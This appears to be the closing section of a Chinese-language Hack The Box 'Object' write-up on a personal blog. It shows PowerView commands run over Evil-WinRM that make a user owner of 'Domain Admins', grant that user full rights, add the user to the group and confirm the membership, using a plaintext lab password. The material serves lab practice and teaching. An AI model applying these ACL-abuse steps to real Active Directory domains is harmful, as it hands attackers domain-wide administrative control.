<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Set-DomainObjectOwner -Identity <span style="color:#e6db74">&#39;Domain Admins&#39;</span> -OwnerIdentity <span style="color:#e6db74">&#39;maria&#39;</span> -Credential $Cred
</span></span></code></pre></div><p>设置maria  对  <code>&quot;Domain Admins&quot;</code> 的完全所有权</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Add-DomainObjectAcl -TargetIdentity <span style="color:#e6db74">&#34;Domain Admins&#34;</span> -PrincipalIdentity maria -Rights All
</span></span></code></pre></div><p>往 <code>Domain Admins</code> 添加 <code>maria</code> 用户</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Add-DomainGroupMember -Identity <span style="color:#e6db74">&#39;Domain Admins&#39;</span> -Members <span style="color:#e6db74">&#39;maria&#39;</span> -Credential $Cred
</span></span></code></pre></div><p>确定 <code>Domain Admins</code> 组成员</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Get-DomainGroupMember -Identity <span style="color:#e6db74">&#39;Domain Admins&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>aria<span style="color:#ae81ff">\D</span>ocuments&gt; . .<span style="color:#ae81ff">\P</span>owerView.ps1
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>aria<span style="color:#ae81ff">\D</span>ocuments&gt; $SecPassword <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;W3llcr4ft3d_4cls&#39;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>$Cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;object.local\maria&#39;</span>, $SecPassword<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>aria<span style="color:#ae81ff">\D</span>ocuments&gt; Set-DomainObjectOwner -Identity <span style="color:#e6db74">&#39;Domain Admins&#39;</span> -OwnerIdentity <span style="color:#e6db74">&#39;maria&#39;</span> -Credential $Cred
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>aria<span style="color:#ae81ff">\D</span>ocuments&gt; Add-DomainObjectAcl -TargetIdentity <span style="color:#e6db74">&#34;Domain Admins&#34;</span> -PrincipalIdentity maria -Rights All
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>aria<span style="color:#ae81ff">\D</span>ocuments&gt; Add-DomainGroupMember -Identity <span style="color:#e6db74">&#39;Domain Admins&#39;</span> -Members <span style="color:#e6db74">&#39;maria&#39;</span> -Credential $Cred
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>aria<span style="color:#ae81ff">\D</span>ocuments&gt; Get-DomainGroupMember -Identity <span style="color:#e6db74">&#39;Domain Admins&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GroupDomain             : object.local
</span></span><span style="display:flex;"><span>GroupName               : Domain Admins
</span></span><span style="display:flex;"><span>GroupDistinguishedName  : CN<span style="color:#f92672">=</span>Domain Admins,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>object,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>MemberDomain            : object.local
</span></span><span style="display:flex;"><span>MemberName              : maria
</span></span><span style="display:flex;"><span>MemberDistinguishedName : CN<span style="color:#f92672">=</span>maria garcia,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>object,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>MemberObjectClass       : user
</span></span><span style="display:flex;"><span>MemberSID               : S-1-5-21-4088429403-1159899800-2753317549-1106
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GroupDomain             : object.local
</span></span><span style="display:flex;"><span>GroupName               : Domain Admins
</span></span><span style="display:flex;"><span>GroupDistinguishedName  : CN<span style="color:#f92672">=</span>Domain Admins,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>object,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>MemberDomain            : object.local
</span></span><span style="display:flex;"><span>MemberName              : Administrator
</span></span><span style="display:flex;"><span>MemberDistinguishedName : CN<span style="color:#f92672">=</span>Administrator,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>object,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>MemberObjectClass       : user
</span></span><span style="display:flex;"><span>MemberSID               : S-1-5-21-4088429403-1159899800-2753317549-500
</span></span></code></pre></div></div>
    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/adcs"
        rel="tag"
        >ADCS</a
      >
    </li></ul>
</footer>
  </div><nav
    id="article-nav"
    data-aos="fade-up"
  ><div class="article-nav-link-wrap article-nav-link-left"><img
              data-src="images/b.jpg"
              data-sizes="auto"
              alt="HTB OpTinselTrace24-4:Neural Noel"
              class="lazyload"
            /><a href="/post/htb-optinseltrace24-4-neural_noel/"></a>
        <div class="article-nav-caption">Prev</div>
        <h3 class="article-nav-title">HTB OpTinselTrace24-4:Neural Noel</h3>
      </div><div class="article-nav-link-wrap article-nav-link-right"><img
              data-src="images/b.jpg"
              data-sizes="auto"
              alt="HTB Compromised"
              class="lazyload"
            /><a href="/post/htb-compromised/"></a>
        <div class="article-nav-caption">Next</div>
        <h3 class="article-nav-title">HTB Compromised</h3>
      </div></nav></article></section>
        </div><footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info"><div>
      <span class="icon-copyright"></span>2020-2025<span class="footer-info-sep rotate"></span>
      Wuvoun
    </div><div>
        Powered by&nbsp;<a
          href="https://gohugo.io/"
          target="_blank"
          >Hugo</a
        >&nbsp; Theme.<a
          href="https://github.com/D-Sketon/hugo-theme-reimu"
          target="_blank"
          >Reimu</a
        >
      </div><div>
        <span class="icon-brush"
          >&nbsp;9.4k</span
        >
        &nbsp;|&nbsp;
        <span class="icon-coffee">&nbsp;00:49</span>
      </div><div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv"
          >Number of visits&nbsp;<span
            id="busuanzi_value_site_pv"
          ></span
        ></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv"
          >Number of visitors&nbsp;<span
            id="busuanzi_value_site_uv"
          ></span
        ></span>
      </div></div>
</footer>
<div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div><div id="mask" class="hide"></div>
      </div><nav id="mobile-nav">
  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents"></nav>
  </div>
</div></div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img
    data-src="/avatar/../images/avatar.webp"
    data-sizes="auto"
    alt="Wuvoun"
    class="lazyload"
  />
  <div class="sidebar-author-name">Wuvoun</div>
  <div class="sidebar-description">少女祈祷中...</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div><div class="sidebar-state-number">12</div>
  </div>
  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
    <div>Categories</div>
    <div class="sidebar-state-number">
      2
    </div>
  </a>
  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
    <div>Tags</div>
    <div class="sidebar-state-number">8</div>
  </a>
</div>
<div class="sidebar-social"></div>
<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Home</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Archives</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">About</div>
    </div></div>
</div></div><div class="sidebar-btn-wrapper">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div></nav>
</div><script
    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aosInit);
    } else {
      aosInit();
    }
  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script><script
    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
  if (window.firework) {
    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
    options.excludeElements = options.excludeelements;
    delete options.excludeelements;
    window.firework(options);
  }
</script>

<div id="lazy-script">
  <div><script data-pjax>
        window.REIMU_POST = {
          author: "Wuvoun",
          title: "HTB-Object",
          url: "https:\/\/wuvoun.github.io\/post\/htb-object\/",
          description: "\rHTB-Object\rnmap -p $ports $ip -sV Starting Nmap 7.95 ( https:\/\/nmap.org ) at 2025-09-15 22:20 CST Nmap scan report for 10.10.11.132 Host is up (0.36s latency). PORT STATE SERVICE VERSION 80\/tcp open http Microsoft IIS httpd 10.0 5985\/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP\/UPnP) 8080\/tcp …",
          cover: "https:\/\/github.com\/wuvoun\/picx-images-hosting\/raw\/master\/output.szb3amhzz.webp",
        };
      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script></div>
</div><script
    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.getRegistrations().then((registrations) => {
        for (let registration of registrations) {
          registration.unregister();
        }
      });
    }
  </script><script>
  const reimuCopyright = String.raw`
   ______     ______     __     __    __     __  __    
  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                    
  `;
  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
  console.log(
    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
    "color: white; background: #ff5252; padding:5px 0;",
    "padding:4px;border:1px solid #ff5252;",
  );
</script></body>
</html>
